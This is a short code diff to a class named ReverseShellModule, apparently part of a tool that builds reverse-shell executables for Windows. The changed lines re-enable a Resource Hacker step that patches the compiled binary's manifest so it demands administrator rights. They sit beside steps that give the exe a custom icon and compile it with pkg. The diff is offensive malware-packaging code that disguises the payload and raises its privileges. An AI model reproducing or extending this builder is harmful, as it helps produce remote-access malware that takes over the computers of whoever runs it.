@@ -167,16 +167,6 @@ export default class ReverseShellModule extends Module {
         console.log('[log] - Appending custom icon...');
         await this.changeIcon(winBinPath);
 
-        // // make the exe run as admin
-        // console.log('[log] - Making the exe require admin rights...');
-        // this.resourceHacker({
-        //     action: "addoverwrite",
-        //     open: winBinPath,
-        //     save: winBinPath,
-        //     resource: path.join(__dirname, './admin-manifest.res'),
-        //     mask: "MANIFEST,1,",
-        // });
-
         // compile final exe
         console.log('[log] - Compiling final exe...');
         this.executePkg(dummyJs, this.finalExeName);
@@ -190,6 +180,17 @@ export default class ReverseShellModule extends Module {
                 dst: finalExePath,
             });
         }
+
+        // make the exe run as admin
+        console.log('[log] - Making the exe require admin rights...');
+        this.resourceHacker({
+            action: "addoverwrite",
+            open: finalExePath,
+            save: finalExePath,
+            resource: path.join(__dirname, './admin-manifest.res'),
+            mask: "MANIFEST",
+        });
+
 
         // clear leftovers
         fs.rmSync(path.join(cachePath, `./${PKG_CACHE_VERSION}`),{ recursive: true, force: true });
